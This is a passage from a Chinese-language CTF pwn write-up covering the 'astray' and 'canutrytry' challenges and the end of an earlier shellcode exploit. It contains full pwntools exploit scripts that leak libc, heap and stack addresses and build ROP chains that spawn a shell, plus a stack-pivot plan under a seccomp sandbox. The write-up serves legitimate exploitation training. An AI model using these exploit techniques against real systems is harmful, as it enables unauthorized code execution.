class=\"comment\"># mov edi,r15d</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,101</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC7\\x0d\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rsi,dh</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor rdx,rdx</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x49\\xBA\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00&#x27;</span>   <span class=\"comment\"># mov r10,0x0deadc0de500</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x44\\x89\\xFe&#x27;</span>     <span class=\"comment\"># mov edi,r15d</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rax,101</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\xC7\\xC7\\x11\\x00\\x00\\x00&#x27;</span> <span class=\"comment\"># mov rsi,17h</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x48\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor rdx,rdx</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x4D\\x31\\xD2&#x27;</span>   <span class=\"comment\"># xor r10,r10</span></span><br><span class=\"line\"><span class=\"string\">b&#x27;\\x0f\\x05&#x27;</span>       <span class=\"comment\"># syscall</span></span><br><span class=\"line\">)</span><br><span class=\"line\">shellcode+=asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">loop:</span></span><br><span class=\"line\"><span class=\"string\">    jmp loop</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">shellcode=shellcode.ljust(<span class=\"number\">0x200</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>)</span><br><span class=\"line\">shellcode+=execve_shellcode</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">io.send(shellcode)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"astray\"><a href=\"#astray\" class=\"headerlink\" title=\"astray\"></a>astray</h2><h3 id=\"ida-分析\"><a href=\"#ida-分析\" class=\"headerlink\" title=\"ida 分析\"></a>ida 分析</h3><p>首先这题很绕，几个地址跳来跳去的，我们要先从init详细分析清楚结构</p>\n<table>\n<thead>\n<tr>\n<th>地址</th>\n<th>保存内容</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>manage_physic[0]</td>\n<td>heap_addr</td>\n</tr>\n<tr>\n<td>magnage_physic[2*i]    (偶数项)</td>\n<td>heap_addr+256*i</td>\n</tr>\n<tr>\n<td>heap2</td>\n<td>0</td>\n</tr>\n<tr>\n<td>heap2+0x8</td>\n<td>0</td>\n</tr>\n<tr>\n<td>heap2+0x10</td>\n<td>0</td>\n</tr>\n<tr>\n<td>V3</td>\n<td>heap_addr</td>\n</tr>\n<tr>\n<td>heap_addr</td>\n<td>1</td>\n</tr>\n<tr>\n<td>heap_addr+0x8</td>\n<td>heap3</td>\n</tr>\n<tr>\n<td>heap_addr+0x10</td>\n<td>&amp;onlyuser</td>\n</tr>\n<tr>\n<td>heap3</td>\n<td>0</td>\n</tr>\n<tr>\n<td>heap3+0x8</td>\n<td>0</td>\n</tr>\n<tr>\n<td>heap3+0x10</td>\n<td>0</td>\n</tr>\n</tbody></table>\n<p>可以看到，mange_pyhsic , heap2 ，heap_addr(heap1),heap3,几个变量，其中，heap1，heap3，不在bss上，user中依靠heap2去寻址，manage中依靠heap1去寻址。寻址通过idx ，从manage_physic中赋值给heap2，和heap3 。这里有一个逻辑漏洞，在check中。</p>\n<h4 id=\"check函数\"><a href=\"#check函数\" class=\"headerlink\" title=\"check函数\"></a>check函数</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804134532550.png\" alt=\"image-20250804134532550\"></p>\n<p>这里只检测，idx大于等于0x14也就是20 ，但没有检测下限，如果这里的idx等于0，那么后面赋值时，就会发生巨大的变化。同时，两个用户可以互用对方的操作。</p>\n<p>但是在check函数还有一个检测，如果是idx是0 ，即 n0x14&#x3D;0，那么v5&#x3D; manage_physic.所以v5[1]&#x3D;*(manage_physic+8),也就是0x10，是过不了检测的。</p>\n<p>正常情况下，我们会读写magnage_physic[2*i] 中的内容，但是如果i&#x3D;0，在User中，我们可以写heap1 这个堆块的内容 ，这里可以修改掉其上的指针，如果后续可以对其上的指针进行读写，那就可以任意地址读写。在manage中会有不同</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804143259945.png\" alt=\"image-20250804143259945\"></p>\n<p>这里有两个可以读写的地址，** (heap+8),是heap3，也就是与idx相关的。** （ *  （heap+16）+ 8），这是 ** heap2，也就是user中 依靠的寻址方式。同时补充一下对权限的检测</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804162343842.png\" alt=\"image-20250804162343842\"></p>\n<p>在初始化时，这里对每一个块都初始了权限，那么其实对&amp; 运算稍微了解一下就知道了。因为manage_physic[0]的权限是0x10，很特殊，似乎manage和user都没有权限去修改。但是，如果进入manage时，<strong>使用user_write去执行呢，似乎可以避开权限的检测</strong>，但是后续会继续检测，也无法往里write。</p>\n<h3 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h3><h4 id=\"通过MANAGE-visit\"><a href=\"#通过MANAGE-visit\" class=\"headerlink\" title=\"通过MANAGE_visit\"></a>通过MANAGE_visit</h4><p>因为直接使用两个write都过不了检测，但是我们使用manage_visit 可以轻松过check，只要heap2不为空。也就说，只要在usr中，过check赋值，就可以在manage中读写。那么我们进入usr_operation,输入MANAGE_visit，就可以过check赋值，而且不做读写操作。此时heap2[0]&#x3D;heap_addr.<br>再从manage_operation中读，可以读到pie和堆的地址信息。再写，就可以覆盖heap1 中 的内容。如果选择覆盖heap1+0x8，那么下次准备往目标写的时候，这个位置又会被覆盖掉。<br>所以，只能通过heap1+0x10的位置来完成任意地址读写。我们把改写后的地方称为fake_addr(位置与&amp;onlyuser位置重合),那么我们之后从manage中访问到的就是** (fake_addr+0x8).</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805013545343.png\" alt=\"image-20250805013545343\"></p>\n<h4 id=\"任意地址读写\"><a href=\"#任意地址读写\" class=\"headerlink\" title=\"任意地址读写\"></a>任意地址读写</h4><p>这样看就清楚很多，如果我们把heap1+0x10 修改为 heap3-8，那么我们可以通过manage_write,修改* (magnage_physic[2*i])，继而通过manage_visit,去任意地址读写。</p>\n<h4 id=\"泄露stack，再rop\"><a href=\"#泄露stack，再rop\" class=\"headerlink\" title=\"泄露stack，再rop\"></a>泄露stack，再rop</h4><p>有读写，泄露的思路自然不用多说。那最后如何getshell呢？保护机制全开，不能修改got，排除syscall和 shellcode ，那就只能rop了，所以还要泄露栈地址。通过libc中的environ泄露栈地址，这个地址与返回地址的偏移动调直接看就行。</p>\n<h3 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;,&#x27;-l&#x27;,&#x27;66%&#x27;]</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./astray&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#manager=0x41A8</span></span><br><span class=\"line\"><span class=\"comment\"># 0x4060</span></span><br><span class=\"line\">pop_rdi=<span class=\"number\">0x2a3e5</span></span><br><span class=\"line\">ret=<span class=\"number\">0x29139</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manager</span>(<span class=\"params\">op,idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Which permission do you want to log in with?(1:manager 1000:user)&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;visit user(MANAGER_visit)\\n&quot;</span>)</span><br><span class=\"line\">    io.send(op)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;1-19: manager can visit\\n&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">user</span>(<span class=\"params\">op,idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Which permission do you want to log in with?(1:manager 1000:user)&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1000</span>))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;user write to logs(USER_write)\\n&quot;</span>)</span><br><span class=\"line\">    io.send(op)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;10-19: user can visit\\n&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manager_read</span>():</span><br><span class=\"line\">\tmanager(<span class=\"string\">&quot;MANAGER_read&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manager_write</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">\tmanager(<span class=\"string\">&quot;MANAGER_write&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\tio.send(content)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manager_user_read</span>():</span><br><span class=\"line\">\tmanager(<span class=\"string\">&quot;MANAGER_visit&quot;</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;to user_logs\\n&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">manager_user_write</span>(<span class=\"params\">content</span>):</span><br><span class=\"line\">\tmanager(<span class=\"string\">&quot;MANAGER_visit&quot;</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;to user_logs\\n&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">\tio.send(content)</span><br><span class=\"line\">\t    </span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io,&quot;b *$rebase(0x179F)&quot;)</span></span><br><span class=\"line\"><span class=\"comment\"># leak pie &amp; heap</span></span><br><span class=\"line\">user(<span class=\"string\">&quot;MANAGER_visit&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">manager_user_read()</span><br><span class=\"line\">io.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">heap_addr=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))<span class=\"comment\">#-0x1f30</span></span><br><span class=\"line\">io.recv(<span class=\"number\">2</span>)</span><br><span class=\"line\">pie=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))-<span class=\"number\">0x41a0</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;heap_addr&quot;</span>,<span class=\"built_in\">hex</span>(heap_addr))</span><br><span class=\"line\">logv(<span class=\"string\">&quot;pie&quot;</span>,<span class=\"built_in\">hex</span>(pie))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># heap1-&gt; next = manage_physic[2]</span></span><br><span class=\"line\">manager_user_write(p64(<span class=\"number\">1</span>)+p64(heap_addr)+p64(heap_addr-<span class=\"number\">8</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">manager_write(p64(pie+elf.got[<span class=\"string\">&quot;puts&quot;</span>]))</span><br><span class=\"line\">manager_user_read()</span><br><span class=\"line\">puts=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">libc_base=puts-libc.sym[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">logv(<span class=\"string\">&quot;libc_base&quot;</span>,<span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">system=libc_base+libc.sym[<span class=\"string\">&quot;system&quot;</span>]</span><br><span class=\"line\">bin_sh=libc_base+<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>))</span><br><span class=\"line\">pop_rdi=libc_base+pop_rdi</span><br><span class=\"line\">ret=libc_base+ret</span><br><span class=\"line\"><span class=\"comment\"># leak stack</span></span><br><span class=\"line\">manager_write(p64(libc_base+libc.sym[<span class=\"string\">&quot;environ&quot;</span>]))</span><br><span class=\"line\">manager_user_read()</span><br><span class=\"line\">stack=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x150</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># heap1-&gt;next=stack</span></span><br><span class=\"line\">manager_write(p64(stack))</span><br><span class=\"line\">payload=p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)</span><br><span class=\"line\">manager_user_write(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#user(&quot;USER_write&quot;,0)</span></span><br><span class=\"line\"><span class=\"comment\">#io.sendlineafter(&quot;user_logs\\n&quot;,str(1))</span></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"canutrytry\"><a href=\"#canutrytry\" class=\"headerlink\" title=\"canutrytry\"></a>canutrytry</h2><h3 id=\"查看沙箱-1\"><a href=\"#查看沙箱-1\" class=\"headerlink\" title=\"查看沙箱\"></a>查看沙箱</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805082927143.png\" alt=\"image-20250805082927143\"></p>\n<p>只允许read，write，close，futex的syscall。看来是要ORW了。</p>\n<h3 id=\"ida-分析-1\"><a href=\"#ida-分析-1\" class=\"headerlink\" title=\"ida 分析\"></a>ida 分析</h3><p>打开一看发现这是一道c++的题目。先从main函数开始分析函数的主要逻辑。</p>\n<h4 id=\"main\"><a href=\"#main\" class=\"headerlink\" title=\"main\"></a>main</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805210913492.png\" alt=\"main函数\"></p>\n<p>先看汇编，发现有很多try，catch，这是c++的异常处理。反汇编后这些部分没有显示出来，我们先不看，先分析主要功能。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213430837.png\" alt=\"main函数\"></p>\n<p>两个主要功能，visit()和left()</p>\n<h5 id=\"visit\"><a href=\"#visit\" class=\"headerlink\" title=\"visit\"></a>visit</h5><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213930699.png\" alt=\"visit函数\"><br><img src=\"C:/Users/22354/AppData/Roaming/Typora/typora-user-images/image-20250805214633791.png\" alt=\"visit函数\"></p>\n<p>visit中有三个选项，2只能按顺序设置堆块大小且只有2次，1 只能按顺序malloc两次堆块，3 可以任意写堆块的内容。且idx无检测。</p>\n<p>1 选项中有对异常的处理。</p>\n<h5 id=\"left\"><a href=\"#left\" class=\"headerlink\" title=\"left\"></a>left</h5><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805221246184.png\" alt=\"left函数\"></p>\n<p>只有一次机会，可以把堆块的内容复制到栈上，大小无限制。且有对异常的处理。</p>\n<p>毫无疑问，此题中异常处理是至关重要的。所以我们接下来要分析所以try ，catch的对应关系。</p>\n<h3 id=\"异常处理对应\"><a href=\"#异常处理对应\" class=\"headerlink\" title=\"异常处理对应\"></a>异常处理对应</h3><h5 id=\"分析方法\"><a href=\"#分析方法\" class=\"headerlink\" title=\"分析方法\"></a>分析方法</h5><p>ida在汇编代码中，会对catch标记，在其后面标注owner by xxx</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222122309.png\" alt=\"catch\"> </p>\n<p>根据这样的对应关系，我们可以把main函数重新反汇编一下，把完整的函数逆向出来。</p>\n<p>当然ida 有视图可以更好的看出函数的跳转对应关系</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222435058.png\" alt=\"跳转\"></p>\n<h5 id=\"分析结果\"><a href=\"#分析结果\" class=\"headerlink\" title=\"分析结果\"></a>分析结果</h5><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    seccomp_add();</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">            try&#123;</span><br><span class=\"line\">                menu();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            catch&#123;</span><br><span class=\"line\">                sub_4016ec();</span><br><span class=\"line\">                sub_401652();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">            try&#123;</span><br><span class=\"line\">                <span class=\"built_in\">stdin</span>&gt;&gt;choice;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(choice!=<span class=\"number\">1</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                visit_nep();</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(choice!=<span class=\"number\">2</span>) <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">                left_nep();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            catch&#123;</span><br><span class=\"line\">                <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;you catch the error &quot;</span> &lt;&lt; err2 &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">                <span class=\"built_in\">std</span>::<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">&quot;here is a gift for you!&quot;</span> &lt;&lt; <span class=\"built_in\">std</span>::<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;setbufaddr:%p\\n&quot;</span>, setbuf_ptr);</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;stackaddr:%p\\n&quot;</span>, &amp;choice);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"思路分析-1\"><a href=\"#思路分析-1\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h4><ol>\n<li>首先要通过visit或left中的异常处理，泄露出stack和 libc的信息。要注意的是，为了后续利用，这一步显然是通过visit 的异常，也就是size值非法。再注意，因为只能按顺序来，所以第一个堆块不能非法。所以要先申请第一个堆块后，利用第二个堆块的大小非法，触发异常拿到stack 和 libc </li>\n<li>紧接着，要利用left中的异常，也就是复制的内容长度超过16.这里需要让异常处理跳转到menu（）的异常处理。只要把left的返回地址，修改为menu 函数执行完成时的返回地址就行。</li>\n<li>第二步完成后，程序跳转到0x4610ec。这里会往bss 段上read ，显然是用来输入ROP的。</li>\n<li>第三步过后，通过0x401652函数，程序最后跳转到0x4015d4。又有一次read，可以覆盖到rbp，同样会触发异常。但是最后还是会leave_ret,可以栈迁移。只要把rbp覆盖为之前输入ROP的地址-8 ，就行。</li>\n</ol>\n<h3 id=\"exp-2\"><a href=\"#exp-2\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./canutrytry&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">visit</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;your choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leave</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;your choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">visit_op</span>(<span class=\"params\">op,size,idx</span>): <span class=\"comment\"># size(content),1</span></span><br><span class=\"line\">\tvisit()</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;your choice &gt;&gt;&quot;</span>,<span class=\"built_in\">str</span>(op))</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> op == <span class=\"number\">2</span> :</span><br><span class=\"line\">\t\tio.sendlineafter(<span class=\"string\">&quot;size&quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> op == <span class=\"number\">3</span> :</span><br><span class=\"line\">\t\tio.sendlineafter(<span class=\"string\">&quot;index&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\t\tio.sendafter(<span class=\"string\">&quot;content&quot;</span>,size)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">leave_op</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tleave()</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&quot;index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401600&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#1 leak libc &amp; stack</span></span><br><span class=\"line\">visit_op(<span class=\"number\">2</span>,<span class=\"number\">0x40</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">visit_op(<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">visit_op(<span class=\"number\">2</span>,-<span class=\"number\">1</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">visit_op(<span class=\"number\">1</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;setbufaddr:&quot;</span>)</span><br><span class=\"line\">libc_base=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x88060</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;stackaddr:&quot;</span>)</span><br><span class=\"line\">stack=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span 